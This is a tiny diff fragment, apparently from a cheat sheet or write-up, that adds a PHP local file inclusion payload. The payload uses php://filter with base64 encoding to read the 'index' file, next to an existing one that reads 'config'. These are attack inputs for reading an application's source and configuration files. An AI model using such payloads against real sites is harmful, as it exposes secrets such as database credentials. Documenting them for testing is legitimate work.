@@ -24,3 +24,7 @@
 ```
 php://filter/read=convert.base64-encode/resource=config
 ```
+
+```
+php://filter/read=convert.base64-encode/resource=index
+```
